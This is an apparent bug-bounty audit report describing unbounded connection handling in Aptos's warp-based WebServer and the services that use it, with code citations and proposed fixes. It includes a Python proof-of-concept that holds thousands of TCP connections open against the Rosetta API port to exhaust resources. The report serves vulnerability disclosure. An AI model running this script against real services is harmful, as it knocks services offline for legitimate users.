# Audit Report

## Title
Unbounded Task Spawning in Warp WebServer Enables Resource Exhaustion DoS on API Services

## Summary
The `WebServer::serve()` function spawns unbounded async tasks for each incoming connection without implementing connection limits or rate limiting. This allows an attacker to exhaust system resources (memory, file descriptors) by opening many simultaneous connections, causing denial of service on critical API endpoints including Rosetta API, Backup Service, and Telemetry Service.

## Finding Description

The `WebServer::serve()` method directly invokes `warp::serve()` without any connection limiting mechanism: [1](#0-0) 

This WebServer is used by multiple critical services:

**Rosetta API** - The bootstrap function creates a WebServer and serves routes without any rate limiting middleware: [2](#0-1) 

The routes only include CORS, logging, and error handling - no rate limiting: [3](#0-2) 

**Backup Service** - Uses `warp::serve()` directly with the same pattern: [4](#0-3) 

**Configuration Analysis** - The `ApiConfig` provides worker thread configuration but no connection limits: [5](#0-4) 

**Runtime Configuration** - The tokio runtime limits blocking threads but NOT async tasks: [6](#0-5) 

The comment explicitly acknowledges the risk but only protects blocking operations, not async task spawning.

**Attack Path:**
1. Attacker opens thousands of TCP connections to Rosetta API (port 8082) or other warp-based services
2. Each connection causes warp/hyper to spawn a new async task via `tokio::spawn()`
3. Tasks accumulate unbounded (only limited by available memory)
4. Memory exhaustion occurs, causing OOM kill or severe performance degradation
5. Service becomes unavailable to legitimate users

**Broken Invariant:** This violates the documented **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The code fails to enforce limits on connection/task counts.

## Impact Explanation

This qualifies as **High Severity** per the Aptos bug bounty criteria:

- **"API crashes"**: Memory exhaustion leads to OOM crashes of API services
- **"Validator node slowdowns"**: If these services run on validator nodes, resource exhaustion degrades node performance
- **"Significant protocol violations"**: Violates the resource limits invariant

**Affected Services:**
- Rosetta API (direct Docker deployment without HAProxy protection)
- Backup Service (used for node backup operations)  
- Telemetry Service (monitoring endpoints)
- Indexer GRPC Server Framework (blockchain data indexing)

While the validator's REST API may be protected by HAProxy configuration with `maxconn 500`: [7](#0-6) 

The Rosetta API documentation shows direct Docker exposure without proxy: [8](#0-7) 

## Likelihood Explanation

**Likelihood: High**

- **Attack Complexity**: Trivial - simple script to open many connections
- **Attacker Requirements**: No authentication required, publicly accessible endpoints
- **Detection**: Difficult to distinguish from legitimate traffic spikes initially
- **Mitigation**: Not implemented at application layer

The Rosetta API binds to `0.0.0.0:8082` by default, exposing it to all network interfaces. [9](#0-8) 

## Recommendation

Implement connection limits at multiple layers:

**1. Application-Level Connection Limiting:**
Add connection counting and limiting to WebServer:

```rust
use std::sync::Arc;
use tokio::sync::Semaphore;

pub struct WebServer {
    pub address: SocketAddr,
    pub tls_cert_path: Option<String>,
    pub tls_key_path: Option<String>,
    pub max_connections: Option<usize>, // New field
}

pub async fn serve<F>(&self, routes: F)
where
    F: Filter<Error = Infallible> + Clone + Sync + Send + 'static,
    F::Extract: Reply,
{
    let routes = if let Some(max_conn) = self.max_connections {
        let semaphore = Arc::new(Semaphore::new(max_conn));
        warp::any()
            .and_then(move |_| {
                let permit = semaphore.clone().try_acquire_owned();
                async move {
                    match permit {
                        Ok(p) => Ok(p),
                        Err(_) => Err(warp::reject::reject()),
                    }
                }
            })
            .untuple_one()
            .and(routes)
            .boxed()
    } else {
        routes.boxed()
    };
    
    match &self.tls_cert_path {
        None => warp::serve(routes).bind(self.address).await,
        Some(cert_path) => {
            warp::serve(routes)
                .tls()
                .cert_path(cert_path)
                .key_path(self.tls_key_path.as_ref().unwrap())
                .bind(self.address)
                .await
        },
    }
}
```

**2. Update ApiConfig:**
Add connection limit configuration:

```rust
pub struct ApiConfig {
    // ... existing fields ...
    
    /// Maximum number of concurrent connections to the API server
    #[serde(default = "default_max_connections")]
    pub max_connections: usize,
}

fn default_max_connections() -> usize {
    1000 // Reasonable default
}
```

**3. Rate Limiting Middleware:**
Consider implementing per-IP rate limiting using the existing `aptos-rate-limiter` crate.

## Proof of Concept

**Attack Script (Python):**

```python
#!/usr/bin/env python3
import socket
import threading
import time

TARGET_HOST = "localhost"
TARGET_PORT = 8082  # Rosetta API port
NUM_CONNECTIONS = 10000

def open_connection(conn_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((TARGET_HOST, TARGET_PORT))
        # Keep connection open without sending data
        # This forces the server to allocate resources
        time.sleep(300)  # Hold for 5 minutes
        sock.close()
    except Exception as e:
        print(f"Connection {conn_id} failed: {e}")

print(f"Starting attack with {NUM_CONNECTIONS} connections...")
threads = []
for i in range(NUM_CONNECTIONS):
    t = threading.Thread(target=open_connection, args=(i,))
    t.start()
    threads.append(t)
    if i % 100 == 0:
        print(f"Opened {i} connections...")

print("Waiting for connections to complete...")
for t in threads:
    t.join()

print("Attack complete.")
```

**Expected Result:**
- Memory usage on Rosetta API container increases linearly with connections
- After sufficient connections (~thousands depending on available RAM), service becomes unresponsive
- Legitimate API requests timeout or fail
- System may OOM-kill the process

**Verification Steps:**
1. Deploy Rosetta API using documented Docker method
2. Run attack script from external host
3. Monitor memory usage: `docker stats aptos-rosetta`
4. Observe service degradation/crash
5. Legitimate requests fail: `curl http://localhost:8082/network/list` times out

## Notes

This vulnerability is distinct from network-level DoS (which is out of scope). It's an **application-level resource exhaustion bug** where the code fails to implement proper resource limits, violating the documented "Resource Limits" invariant. The issue affects multiple production services and is readily exploitable without authentication.

### Citations

**File:** crates/aptos-warp-webserver/src/webserver.rs (L34-50)
```rust
    pub async fn serve<F>(&self, routes: F)
    where
        F: Filter<Error = Infallible> + Clone + Sync + Send + 'static,
        F::Extract: Reply,
    {
        match &self.tls_cert_path {
            None => warp::serve(routes).bind(self.address).await,
            Some(cert_path) => {
                warp::serve(routes)
                    .tls()
                    .cert_path(cert_path)
                    .key_path(self.tls_key_path.as_ref().unwrap())
                    .bind(self.address)
                    .await
            },
        }
    }
```

**File:** crates/aptos-rosetta/src/lib.rs (L138-160)
```rust
    let api = WebServer::from(api_config.clone());
    let handle = tokio::spawn(async move {
        // If it's Online mode, add the block cache
        let rest_client = rest_client.map(Arc::new);

        // TODO: The BlockRetriever has no cache, and should probably be renamed from block_cache
        let block_cache = rest_client.as_ref().map(|rest_client| {
            Arc::new(BlockRetriever::new(
                api_config.max_transactions_page_size,
                rest_client.clone(),
            ))
        });

        let context = RosettaContext::new(
            rest_client.clone(),
            chain_id,
            block_cache,
            supported_currencies,
        )
        .await;
        api.serve(routes(context)).await;
    });
    Ok(handle)
```

**File:** crates/aptos-rosetta/src/lib.rs (L163-189)
```rust
/// Collection of all routes for the server
pub fn routes(
    context: RosettaContext,
) -> impl Filter<Extract = (impl Reply,), Error = Infallible> + Clone {
    account::routes(context.clone())
        .or(block::block_route(context.clone()))
        .or(construction::combine_route(context.clone()))
        .or(construction::derive_route(context.clone()))
        .or(construction::hash_route(context.clone()))
        .or(construction::metadata_route(context.clone()))
        .or(construction::parse_route(context.clone()))
        .or(construction::payloads_route(context.clone()))
        .or(construction::preprocess_route(context.clone()))
        .or(construction::submit_route(context.clone()))
        .or(network::list_route(context.clone()))
        .or(network::options_route(context.clone()))
        .or(network::status_route(context.clone()))
        .or(health_check_route(context))
        .with(
            warp::cors()
                .allow_any_origin()
                .allow_methods(vec![Method::GET, Method::POST])
                .allow_headers(vec![warp::http::header::CONTENT_TYPE]),
        )
        .with(logger())
        .recover(handle_rejection)
}
```

**File:** storage/backup/backup-service/src/lib.rs (L12-30)
```rust
pub fn start_backup_service(address: SocketAddr, db: Arc<AptosDB>) -> Runtime {
    let backup_handler = db.get_backup_handler();
    let routes = get_routes(backup_handler);

    let runtime = aptos_runtimes::spawn_named_runtime("backup".into(), None);

    // Ensure that we actually bind to the socket first before spawning the
    // server tasks. This helps in tests to prevent races where a client attempts
    // to make a request before the server task is actually listening on the
    // socket.
    //
    // Note: we need to enter the runtime context first to actually bind, since
    //       tokio TcpListener can only be bound inside a tokio context.
    let _guard = runtime.enter();
    let server = warp::serve(routes).bind(address);
    runtime.handle().spawn(server);
    info!("Backup service spawned.");
    runtime
}
```

**File:** config/src/config/api_config.rs (L69-93)
```rust
    /// Optional: Maximum number of worker threads for the API.
    ///
    /// If not set, `runtime_worker_multiplier` will multiply times the number of CPU cores on the machine
    pub max_runtime_workers: Option<usize>,
    /// Multiplier for number of worker threads with number of CPU cores
    ///
    /// If `max_runtime_workers` is set, this is ignored
    pub runtime_worker_multiplier: usize,
    /// Configs for computing unit gas price estimation
    pub gas_estimation: GasEstimationConfig,
    /// Periodically call gas estimation
    pub periodic_gas_estimation_ms: Option<u64>,
    /// Configuration to filter view function requests.
    pub view_filter: ViewFilter,
    /// Periodically log stats for view function and simulate transaction usage
    pub periodic_function_stats_sec: Option<u64>,
    /// The time wait_by_hash will wait before returning 404.
    pub wait_by_hash_timeout_ms: u64,
    /// The interval at which wait_by_hash will poll the storage for the transaction.
    pub wait_by_hash_poll_interval_ms: u64,
    /// The number of active wait_by_hash requests that can be active at any given time.
    pub wait_by_hash_max_active_connections: usize,
    /// Allow submission of encrypted transactions via the API
    pub allow_encrypted_txns_submission: bool,
}
```

**File:** crates/aptos-runtimes/src/lib.rs (L38-54)
```rust
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
        .enable_all();
    if let Some(num_worker_threads) = num_worker_threads {
        builder.worker_threads(num_worker_threads);
    }
```

**File:** docker/compose/aptos-node/haproxy.cfg (L8-12)
```text
    # Limit the maximum number of connections to 500 (this is ~5x the validator set size)
    maxconn 500

    # Limit the maximum number of connections per second to 300 (this is ~3x the validator set size)
    maxconnrate 300
```

**File:** docker/rosetta/README.md (L44-55)
```markdown
**online mode**

```
docker run -p 8082:8082 --rm -v $(pwd)/data:/opt/aptos aptos-core:rosetta-latest online --config /opt/aptos/fullnode.yaml
```

**offline mode**

```
docker run -p 8082:8082 --rm -v $(pwd)/data:/opt/aptos aptos-core:rosetta-latest offline
```

```

**File:** crates/aptos-rosetta/src/main.rs (L172-175)
```rust
pub struct OfflineArgs {
    /// Listen address for the server. e.g. 0.0.0.0:8082
    #[clap(long, default_value = "0.0.0.0:8082")]
    listen_address: SocketAddr,
```
